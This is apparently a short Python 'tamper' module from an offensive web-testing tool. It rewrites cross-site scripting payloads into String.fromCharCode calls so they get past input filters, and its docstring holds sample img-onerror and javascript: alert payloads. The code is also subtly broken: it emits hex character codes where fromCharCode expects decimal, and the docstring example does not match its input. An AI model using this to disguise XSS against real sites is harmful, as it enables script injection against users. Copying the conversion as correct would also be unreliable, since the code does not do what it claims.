import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
 convert to fromCharCode

    >>> tamper("selet")
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
    """
    string=re.sub(r"(?<=[=:])[\S]*(?=[;<>\s/\\])",convert_this,str(payload))

    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    new_word="String.fromCharCode("+",".join("{:02x}".format(ord(c)) for c in string)+')'
    return new_word
